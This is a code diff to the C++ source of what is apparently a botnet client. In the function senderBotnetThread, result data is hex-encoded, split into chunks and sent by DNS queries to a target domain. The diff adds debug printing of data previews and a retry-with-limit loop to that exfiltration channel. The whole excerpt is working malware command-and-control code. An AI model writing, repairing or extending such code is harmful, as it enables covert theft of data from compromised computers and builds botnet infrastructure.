@@ -92,44 +92,61 @@ DWORD senderBotnetThread(LPVOID lpParam)
         // --- Phase 4: Send data back to server in chunks ---
         if (!dataToSend.empty()) {
             std::cout << "[Sending] Transmitting result (" << dataToSend.length() << " bytes) in chunks...\n";
+            std::cout << "[Debug] Data preview: '" << dataToSend.substr(0, std::min<size_t>(50, dataToSend.length())) << "...'\n";
             
             // Split dataToSend into chunks of max_len and send each chunk
             size_t offset = 0;
             size_t offset_number = 0;
             const size_t totalLen = dataToSend.size();
+            int consecutiveFailures = 0;
+            const int MAX_FAILURES = 3;
             
             while (offset < totalLen) {
                 size_t chunkLen = std::min<size_t>(max_len, totalLen - offset);
                 std::string chunk = dataToSend.substr(offset, chunkLen);
                 offset_number = offset / max_len;
                 
-                std::cout << "  [+] Sending chunk " << offset_number << " (packet #" << packetNumber << ")\n";
+                std::cout << "  [+] Sending chunk " << offset_number << " (packet #" << packetNumber << ", " << chunkLen << " bytes)\n";
+                std::cout << "  [Debug] Chunk hex preview: " << chunk.substr(0, std::min<size_t>(20, chunk.length())) << "...\n";
                 
                 // Convert chunk to hex for DNS transmission
                 std::string chunkHex = convertToHex(chunk.c_str());
+                std::cout << "  [Debug] Hex length: " << chunkHex.length() << " chars\n";
+                
                 int success = sendDataTypeC(connectionId, packetNumber, offset_number,
                                             TARGET_DOMAIN.c_str(), chunkHex.c_str());
 
                 if (success == 0) {
                     // Sent OK -> increment packet number
+                    std::cout << "  [✓] Chunk sent successfully\n";
                     packetNumber++;
                     if (packetNumber > 999) {
                         packetNumber = 0;
                     }
 
                     offset += chunkLen;
+                    consecutiveFailures = 0; // Reset failure counter
                     Sleep(50);
                 } else {
-                    std::cout << "  [!] Failed to send chunk, stopping transmission\n";
-                    // Re-enqueue remaining data if needed
-                    std::string remaining = dataToSend.substr(offset);
-                    EnqueueSend(remaining);
-                    break;
+                    consecutiveFailures++;
+                    std::cout << "  [!] Failed to send chunk (attempt " << consecutiveFailures << "/" << MAX_FAILURES << ")\n";
+                    
+                    if (consecutiveFailures >= MAX_FAILURES) {
+                        std::cout << "  [✗] Max failures reached, discarding data to prevent infinite loop\n";
+                        // Discard data to prevent infinite retry loop
+                        break;
+                    } else {
+                        // Wait and retry
+                        std::cout << "  [~] Retrying after delay...\n";
+                        Sleep(500);
+                    }
                 }
             }
             
             if (offset >= totalLen) {
                 std::cout << "[+] All result chunks sent successfully\n";
+            } else if (consecutiveFailures >= MAX_FAILURES) {
+                std::cout << "[!] Transmission failed, data discarded\n";
             }
         } else {
             // No data to send, brief wait before next poll cycle
